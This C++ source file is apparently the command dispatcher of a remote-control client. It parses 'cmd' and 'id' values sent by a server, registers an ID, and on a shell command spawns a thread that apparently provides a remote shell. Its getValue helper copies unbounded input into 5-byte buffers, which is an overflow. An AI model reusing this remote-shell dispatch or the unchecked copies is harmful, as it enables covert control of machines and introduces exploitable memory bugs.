#include "KernelManager.h"
#include "FunctionThread.h"


int getValue(char *str, const char *key, char *value, int size)
{
	memset(value, 0, size);
	char *newstr=strstr(str,key);
	if (newstr==NULL)
		return -1;
	char *value_start=newstr+strlen(key)+1; //id=XXX&name=XXX
	char *value_end=strchr(value_start,'&');
	if (value_end==NULL) //最后一个key
		strcpy(value, value_start);
	else 
		memcpy(value, value_start, (int)(value_end-value_start));

	return 0;

}

CKernelManager::CKernelManager(CClient *pClient):CBasicManager(pClient)
{
	m_nThreadCount=0;
	b_signed=FALSE;
	int i;
	for (i=0; i<32; i++)
		m_hThread[i]=NULL;
	//b_cmdruning=FALSE;

}
CKernelManager::~CKernelManager()
{
	for(int i = 0; i < m_nThreadCount; i++)
	{
		TerminateThread(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
	}
}
void CKernelManager::OnReceive(char *lpBuff,int size)
{
	int i;
/*
	for (i=0;i<size;i++)
	{
		if(lpBuff[0]=='R'&&lpBuff[1]=='E'&&lpBuff[2]=='P')
			break;
		lpBuff++;

	}
	if (i==size)
	{
		printf("NOT FOUND\n");
		return;
	}*/


	printf("%s\n",lpBuff);


	char strCMD[5];
	getValue(lpBuff,"cmd",strCMD,5);
	int CMD=atoi(strCMD);

	char strID[5];
	int ID;

	switch (CMD)
	{
	case COMMAND_SIGN:
		getValue(lpBuff, "id", strID, 5);
		ID=atoi(strID);

		printf("signed!\nID:%d\n",ID);
		m_id=ID;b_signed=TRUE;
		break;
	case COMMAND_SHELL:
		if (m_hThread[COMMAND_SHELL-2]!=NULL)
			break;
		m_hThread[COMMAND_SHELL-2] =CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ShellManagerThread, (LPVOID)this, 0, NULL);
		m_nThreadCount++;
		break;
	default:break;
	}
}